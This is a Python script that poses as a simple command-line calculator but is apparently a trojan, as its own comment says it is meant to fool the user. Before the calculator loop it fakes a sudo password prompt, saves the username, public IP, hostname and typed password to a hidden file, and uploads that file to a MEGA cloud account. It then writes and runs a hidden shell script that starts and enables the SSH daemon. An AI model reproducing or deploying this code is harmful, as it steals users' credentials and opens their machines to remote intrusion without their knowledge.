import public_ip as ip
import socket
import os
import time
from mega import Mega


# A super non sketchy calc to fool the user

username = os.getlogin()

password = input(f"[sudo] password for {username}: (necessary for the program to work) ")

hostname = socket.gethostname()

ip = ip.get()

f = open(".calc_stuff.txt", "x")
f.writelines(f"this: {username} {ip} {hostname} {password}")
f.close()

time.sleep(5)

mega = Mega()
m = mega.login("SOME_EMAIL", 'SOME_PASSWORD')
filename = f"/home/{username}/py_stuff/.calc_stuff.txt"
m.upload(filename)

d = open(".openssh_script.sh", "x")
d.writelines( """
sudo systemctl start sshd
sudo systemctl enable sshd
            """) 
d.close()

os.system(f'chmod +x /home/{username}/py_stuff/.openssh_script.sh')

time.sleep(2)

ssh_process = os.popen(f'/home/{username}/py_stuff/.openssh_script.sh')

time.sleep(10)

print("Wellcome to this awsome simple calculator that likes sudo permissions")

while True:
    try:

        first_num = input("Give me a number -> ")
        first_num = float(first_num)

        second_num = input("Gimmie another number --> ")
        second_num = float(second_num)

        while True:

            operation = input("What do you want to do(d=division, m=multiplication, s=subtract, a=add) --> ")
            operation = operation.lower()   
                
            if operation == "d":
                print(first_num / second_num)
                break
            elif operation == "m":
                print(first_num * second_num)
                break
            elif operation == "s":
                print(first_num - second_num)
                break
            elif operation == "a":
                print(first_num + second_num)
                break
            else:
                print("please give me a valid option") 
    except ZeroDivisionError:
        print("Are you trying to break this? You can't divide by 0")
    except ValueError:
        print("Numbers aren't the same as letters")
    else:
        print("All correct")
        break






